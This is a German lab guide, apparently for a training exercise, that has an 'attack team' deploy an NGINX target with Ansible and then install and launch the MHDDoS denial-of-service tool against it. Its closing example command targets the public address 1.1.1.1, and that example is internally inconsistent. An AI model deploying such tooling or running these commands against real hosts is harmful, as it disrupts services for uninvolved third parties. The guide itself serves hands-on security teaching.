# ATTACK-Team: Step-by-Step Guide

Auf eurem Steuerungsrechner (Control Node) wurde das NGINX und Ansbile Paket bereits installiert, so dass ihr direkt mit der Installation beginnen könnt.

# Guide

## Quest 1: NGINX Aufsetzen

### Schritt 1: Ansible Struktur vorbereiten (Control Node)

Öffne die Konsole und erstelle ein Hauptverzeichnis für dein Ansible-Projekt auf dem Schreibtisch und wechsele in das Verzeichnis

```bash
cd Schreibtisch
```

```bash
mkdir ansible
```

```bash
cd ansible
```

Erstelle die notwendige Verzeichnisstruktur innerhalb des ansible Orderns

```bash
mkdir inventory
```

```bash
mkdir playbooks
```

```bash
mkdir nginx
```

### Schritt 2: Ansible Verbindung zum Server einrichten und testen

Ansible Inventory auf dem Steuerungsrechnung erstellen (das Inventory umfasst alle Zielserver, auf denen die Konfiguration angewendet werden soll)

```bash
nano inventory/hosts
```

Füge den folgenden Inhalt hinzu und ersetze “your\_server\_ip” durch die IP-Adresse deiner Server, speichern und schließen

```bash
[nginx]
!!!!!!!PUT YOUR NGINX SERVER IPV6 HERE!!!!!!!

[mhddos]
!!!!!!!PUT YOUR MHDDOS SERVER IPV6 HERE!!!!!!!
```

Überprüfe die Verbindung zu dem Servern mit dem ansible ping, das Ergebnis sollte pong sein, was bedeutet, dass die Verbindung erfolgreich war

```bash
ansible -i ~/Schreibtisch/ansible/inventory/hosts all -m ping --user ubuntu --private-key ~/.ssh/id_rsa
```

![Untitled](ATTACK-Team%20Step-by-Step%20Guide%20e5f4ab167c3144bd9a27c654625e6f2b/Untitled.png)

### Schritt 3: Ansible Playbook erstellen

Erstelle das Ansible Playbook

```bash
nano playbooks/install_nginx.yml
```

Fügen folgenden Inhalt ein

```yaml
---
- name: Install and configure Nginx
  hosts: nginx
  become: yes
  vars:
    nginx_conf_template: /etc/nginx/nginx.conf
    server_name: 10.192.160.214
  tasks:
    - name: Ensure apt cache is up to date
      apt:
        update_cache: yes

    - name: Ensure Nginx is installed
      apt:
        name: nginx
        state: present

    - name: Start and enable Nginx service
      systemd:
        name: nginx
        state: started
        enabled: yes

    - name: Create Nginx configuration file from template
      template:
        src: ~/Schreibtisch/ansible/nginx/nginx.conf.j2
        dest: "{{ nginx_conf_template }}"
      notify:
        - restart nginx

    - name: Ensure firewall allows HTTP and HTTPS traffic
      ufw:
        rule: allow
        port: "80,443"
        proto: tcp

  handlers:
    - name: restart nginx
      systemd:
        name: nginx
        state: restarted
```

### Schritt 4: NGINX Konfiguration erstellen

Erstelle die Datei “nginx.conf.j2” im nginx Verzeichnis

```yaml
nano nginx/nginx.conf.j2
```

Füge die Konfiguration ein

```yaml
# Festlegen des Benutzerkontos für den Nginx-Prozess
user www-data;

# Automatische Erkennung der Anzahl der Arbeiterprozesse basierend auf der Anzahl der CPU-Kerne
worker_processes auto;

# Pfad zur PID-Datei von Nginx
pid /run/nginx.pid;

# Einbinden von zusätzlichen Modulen, die in /etc/nginx/modules-enabled/ definiert sind
include /etc/nginx/modules-enabled/*.conf;

events {
    # Maximale Anzahl der gleichzeitigen Verbindungen, die ein Arbeiterprozess handhaben kann
    worker_connections 768;

    # Erlaubt es einem Arbeiterprozess, mehrere Verbindungen gleichzeitig zu akzeptieren (optional)
    # multi_accept on;
}

http {
    ##
    # Grundlegende Einstellungen
    ##
    # Aktivieren des Sendfile-Mechanismus für effizientere Dateiübertragungen
    sendfile on;

    # Reduziert das Kopieren von Paketen und erhöht die Performance durch direkte Speicherzuweisungen
    tcp_nopush on;

    # Reduziert die Latenz, indem kleine Pakete sofort gesendet werden
    tcp_nodelay on;

    # Timeout-Wert für Keep-Alive-Verbindungen (Zeitspanne, in der Verbindungen offen bleiben)
    keepalive_timeout 65;

    # Maximale Größe des Hash-Tables für MIME-Typen (Optimierung der MIME-Typ-Suche)
    types_hash_max_size 2048;

    # Einbinden der MIME-Typen aus einer externen Datei
    include /etc/nginx/mime.types;
    
    # Standard-MIME-Typ, wenn kein Typ bestimmt werden kann
    default_type application/octet-stream;

    ##
    # SSL/TLS Einstellungen
    ##
    # Zulässige SSL/TLS-Protokolle (nur sichere Protokolle zulassen)
    ssl_protocols TLSv1.2 TLSv1.3;

    # Bevorzugt die Server-Ziffernsaetze über die des Clients
    ssl_prefer_server_ciphers on;

    # Festlegen der zulässigen Ziffernsätze für SSL/TLS-Verbindungen (starke Verschlüsselung)
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';

    # Timeout-Wert für SSL-Sitzungen (hier auf 10 Stunden erhöht)
    ssl_session_timeout 10h;

    # Größe des gemeinsamen Cache-Speichers für SSL-Sitzungen
    ssl_session_cache shared:SSL:50m;

    # Deaktiviert SSL-Sitzungstickets für zusätzliche Sicherheit
    ssl_session_tickets off;

    ##
    # Diffie-Hellman-Parameter für erhöhte Sicherheit
    ##
    ssl_dhparam /etc/nginx/ssl/dhparam.pem;

    ##
    # HTTP Strict Transport Security (HSTS)
    ##
    # Erzwingt die Nutzung von HTTPS für alle Verbindungen (1 Jahr)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    ##
    # Sicherheitsrelevante HTTP-Header
    ##
    # Content Security Policy (CSP) zur Verhinderung von XSS-Angriffen
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; frame-ancestors 'none';" always;

    # Verhindert Clickjacking durch Festlegen, dass die Seite nicht in einem Frame eingebettet werden darf
    add_header X-Frame-Options "SAMEORIGIN" always;

    # Verhindert MIME-Type-Sniffing
    add_header X-Content-Type-Options "nosniff" always;

    # Aktiviert den XSS-Schutz im Browser
    add_header X-XSS-Protection "1; mode=block" always;

    # Steuerung des Referrer-Policy-Headers (verhindert die Weitergabe des Referrers)
    add_header Referrer-Policy "no-referrer" always;

    # Steuerung des X-Robots-Tag-Headers (verhindert das Indexieren durch Suchmaschinen)
    add_header X-Robots-Tag "none" always;

    # Steuerung des X-Download-Options-Headers (verhindert das automatische Öffnen von Downloads)
    add_header X-Download-Options "noopen" always;

    # Steuerung des X-Permitted-Cross-Domain-Policies-Headers (verhindert das Laden von Ressourcen von anderen Domains)
    add_header X-Permitted-Cross-Domain-Policies "none" always;

    ##
    # Logging Einstellungen
    ##
    # Pfad zur Access-Log-Datei
    access_log /var/log/nginx/access.log;

    # Pfad zur Error-Log-Datei
    error_log /var/log/nginx/error.log;

    ##
    # Gzip-Komprimierung
    ##
    # Aktiviert Gzip-Komprimierung für effizientere Datenübertragung
    gzip on;

    # Deaktiviert Gzip-Komprimierung für den Internet Explorer 6 (Kompatibilitätsgründe)
    gzip_disable "msie6";

    ##
    # Einbinden der Konfigurationsdateien für virtuelle Hosts
    ##
    # Einbinden der allgemeinen Konfigurationsdateien
    include /etc/nginx/conf.d/*.conf;

    # Einbinden der Site-spezifischen Konfigurationsdateien
    include /etc/nginx/sites-enabled/*;
        server {
            ##
            # Spezielle Einstellungen für robots.txt
            ##
            location = /robots.txt {
                # Erlaubt den Zugriff auf robots.txt für alle Benutzer
                allow all;

                # Deaktiviert das Logging von 404-Fehlern für diese Datei
                log_not_found off;

                # Deaktiviert das Access-Logging für diese Datei
                access_log off;
            }        
        }    
}
```

### Schritt 5: Playbook ausführen

Führe das Playbook mit Ansible aus (dauert einige Zeit)

```bash
ansible-playbook ~/Schreibtisch/ansible/playbooks/install_nginx.yml --user ubuntu --private-key ~/.ssh/id_rsa -i ~/Schreibtisch/ansible/inventory/hosts
```

![Untitled](ATTACK-Team%20Step-by-Step%20Guide%20e5f4ab167c3144bd9a27c654625e6f2b/Untitled%201.png)

### Schritt 6: Überprüfe die Installation

Verbindet euch über SSH mit der “NGINX Instanz” 

```bash
ssh -i ~/.ssh/id_rsa ubuntu@!!!!!!!PUT YOUR NGINX SERVER IPV6 HERE!!!!!!!
```

Wenn das erfolgreich war sollte es wie folgt aussehen (ggfs. anderer Team Name):

![Untitled](ATTACK-Team%20Step-by-Step%20Guide%20e5f4ab167c3144bd9a27c654625e6f2b/Untitled%202.png)

Nun prüft ob der Nginx Service läuft

```bash
systemctl status nginx
```

![Untitled](ATTACK-Team%20Step-by-Step%20Guide%20e5f4ab167c3144bd9a27c654625e6f2b/Untitled%203.png)

Rufe die floating IP im Browser auf, Du solltest nun folgendes sehen

![Untitled](ATTACK-Team%20Step-by-Step%20Guide%20e5f4ab167c3144bd9a27c654625e6f2b/Untitled%204.png)

Glückwunsch, dein NGINX Webserver läuft!

![https://media3.giphy.com/media/pHYaWbspekVsTKRFQT/giphy.gif?cid=7941fdc65faqc4ondkceasepec7sqifygm2jb494kj7hmik0&ep=v1_gifs_search&rid=giphy.gif&ct=g](https://media3.giphy.com/media/pHYaWbspekVsTKRFQT/giphy.gif?cid=7941fdc65faqc4ondkceasepec7sqifygm2jb494kj7hmik0&ep=v1_gifs_search&rid=giphy.gif&ct=g)

### Schritt 7: Systemmonitoring aktivieren

Aktiviere mit folgendem Befehl das Monitoring und lasse das Fenster geöffnet um gleich den Effekt deines DDos Angriffs beobachten zu können

```bash
htop
```

## Quest 2: DDos Tool aufsetzen

### Schritt 1:  Ansible Playbook erstellen

Erstelle das Ansible Playbook zum Aufsetzen der DDos Software

```bash
nano playbooks/install_MHDDoS.yml
```

Fügen folgenden Inhalt ein

```yaml
---
- name: Install MHDDoS on a Linux server
  hosts: mhddos
  become: true

  tasks:
    - name: Update the package list
      apt:
        update_cache: yes

    - name: Ensure Python 3 and virtualenv are installed
      apt:
        name:
          - python3
          - python3-pip
          - python3-venv
        state: present

    - name: Ensure git is installed
      apt:
        name: git
        state: present

    - name: Install required system packages
      apt:
        name:
          - build-essential
          - libssl-dev
          - libffi-dev
          - python3-dev
          - libjpeg-dev
          - zlib1g-dev
          - libblas-dev
          - liblapack-dev
          - gfortran
        state: present

    - name: Clone the MHDDoS repository
      git:
        repo: 'https://github.com/MatrixTM/MHDDoS.git'
        dest: /opt/MHDDoS
        update: yes

    - name: Create a virtual environment
      command: python3 -m venv /opt/MHDDoS/venv
      args:
        creates: /opt/MHDDoS/venv

    - name: Upgrade pip in the virtual environment
      command: /opt/MHDDoS/venv/bin/pip install --upgrade pip

    - name: Install necessary Python packages in the virtual environment
      pip:
        name:
          - setuptools
          - wheel
          - flask
          - PyRoxy
        virtualenv: /opt/MHDDoS/venv
        virtualenv_command: /usr/bin/python3 -m venv

    - name: Install required Python packages from requirements.txt in the virtual environment
      pip:
        requirements: /opt/MHDDoS/requirements.txt
        virtualenv: /opt/MHDDoS/venv
        virtualenv_command: /usr/bin/python3 -m venv

    - name: Run MHDDoS script
      command: /opt/MHDDoS/venv/bin/python /opt/MHDDoS/start.py
      args:
        chdir: /opt/MHDDoS/
      register: mhddos_output

    - name: Print MHDDoS output
      debug:
        var: mhddos_output.stdout
```

### Schritt 2: Playbook ausführen

Führe das Playbook mit Ansible aus (dauert einige Zeit)

```bash
ansible-playbook ~/Schreibtisch/ansible/playbooks/install_MHDDoS.yml --user ubuntu --private-key ~/.ssh/id_rsa -i ~/Schreibtisch/ansible/inventory/hosts
```

### Schritt 3: SSH Verbindung

Verbindet euch über SSH mit der “MHDDoS Instanz” 

```bash
ssh -i ~/.ssh/id_rsa ubuntu@<your-server-ip>
```

Wenn das erfolgreich war solltet es wie folgt aussehen:

![Untitled](ATTACK-Team%20Step-by-Step%20Guide%20e5f4ab167c3144bd9a27c654625e6f2b/Untitled%205.png)

### Schritt 4: Der erste DDos Angriff

Wechsel nun in das Verzeichnis der Dos Anwendung: /opt/MHDDoS

```bash
cd /opt/MHDDoS/
```

Bevor wir loslegen müssen wir noch die virtuelle Umgebung aktivierten

```bash
source venv/bin/activate
```

DDos Angriffe lassen sich nun über die Kommandozeile mit folgendem Syntax starten

```bash
python3 start.py <1=method> <2=url> <3=socks_type> <4=threads> <5=proxylist> <6=rpc> <7=duration> <8=debug=optional>
```

Hier eine Erklärung der einzelnen Parameter:

- Method (type of attack)
- Target URL or IP Address
- Proxy Version ([Proxy Usage](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Support-!))
- Proxy File ([Proxy File Format](https://github.com/MHProDev/MHDDoS/wiki/Proxy-Files))
- Number of threads to use ([Multi Threading](https://en.wikipedia.org/wiki/Multithreading_(computer_architecture)))
- RPC (Requests pre connection)
- Duration (Time to finish attack in seconds)
- Debug Mode (Optional)

<aside>
⚠️ Startet langsam! Ziel ist es die Auslastung nie über 50% zu treiben!

</aside>

Dies ist ein Beispiel Command mit dem ihr starten könnt:

```bash
# Running udp attack from 100 threads, for 10 seconds  
python start.py connection 1.1.1.1 100 10
```